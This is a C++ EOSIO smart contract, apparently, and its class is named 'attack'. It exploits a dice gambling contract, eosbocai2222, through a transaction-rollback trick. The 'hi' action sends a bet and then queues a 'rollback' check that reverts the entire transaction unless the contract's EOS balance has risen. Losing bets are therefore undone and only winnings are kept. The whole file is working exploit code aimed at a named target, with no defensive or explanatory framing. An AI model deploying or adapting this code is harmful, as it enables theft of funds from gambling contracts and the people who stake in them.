#include <utility>
#include <vector>
#include <string>
#include <eosiolib/eosio.hpp>
#include <eosiolib/time.hpp>
#include <eosiolib/asset.hpp>
#include <eosiolib/contract.hpp>
#include <eosiolib/types.hpp>
#include <eosiolib/transaction.hpp>
#include <eosiolib/crypto.h>
#include <boost/algorithm/string.hpp>
#include "eosio.token.hpp"

using eosio::asset;
using eosio::permission_level;
using eosio::action;
using eosio::print;
using eosio::name;
using eosio::unpack_action_data;
using eosio::symbol_type;
using eosio::transaction;
using eosio::time_point_sec;


class attack : public eosio::contract {
    public:
        attack(account_name self):eosio::contract(self)
        {}

        //@abi action
        void rollback(asset in)
        {
            require_auth(_self);
            asset pool = eosio::token(N(eosio.token)).get_balance(_self, symbol_type(S(4, EOS)).name());
            eosio_assert(in.amount > pool.amount, "rollback");
        }

        //@abi action
        void hi(asset bet)
        {
            require_auth(_self);
            asset pool = eosio::token(N(eosio.token)).get_balance(_self, symbol_type(S(4, EOS)).name());
            std::string memo = "dice-noneage-66-user";
            print(memo); 
            action(
                permission_level(_self, N(active)),
                N(eosio.token), N(transfer),
                std::make_tuple(_self, N(eosbocai2222), bet, memo)
            ).send();

            action(
               permission_level{_self, N(active)},
                _self, N(rollback),
                std::make_tuple(pool)
            ).send();
        }
};

#define EOSIO_ABI_EX( TYPE, MEMBERS ) \
extern "C" { \
   void apply( uint64_t receiver, uint64_t code, uint64_t action ) { \
      auto self = receiver; \
      if( code == self || code == N(eosio.token)) { \
         if( action == N(transfer)){ \
                eosio_assert( code == N(eosio.token), "Must transfer EOS"); \
         } \
         TYPE thiscontract( self ); \
         switch( action ) { \
            EOSIO_API( TYPE, MEMBERS ) \
         } \
         /* does not allow destructor of thiscontract to run: eosio_exit(0); */ \
      } \
   } \
}

EOSIO_ABI_EX( attack,
        (hi)(rollback)
)
